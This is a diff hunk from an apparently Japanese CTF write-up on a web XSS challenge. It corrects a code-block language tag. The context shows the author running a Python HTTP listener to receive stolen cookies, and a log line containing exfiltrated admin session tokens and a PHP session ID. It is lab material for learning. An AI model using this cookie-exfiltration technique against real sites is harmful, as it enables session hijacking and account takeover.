@@ -75,7 +75,7 @@ tags: ['MODCC', 'Writeup', 'Web', 'XSS']
 ```
 
 > VPN接続していたので自分の環境で`python3 -m http.server 8000`でcookieが届くようにした
-```bahs
+```bash
 10.2.0.7 - - [01/Feb/2026 11:43:29] "GET /?c=admin_session=416e2d751b6a0eaca1b2640a75e9e888e37708054e0cc76118d4faea21dfae50;%20admin_session_regular=cbfee9f5b4fa110e0b6a11db368502af89541c259d8c7904d3a9066058eafc7e;%20PHPSESSID=a924c621cb2d76ef962185b47da56bd5 HTTP/1.1" 200 -
 ```
 
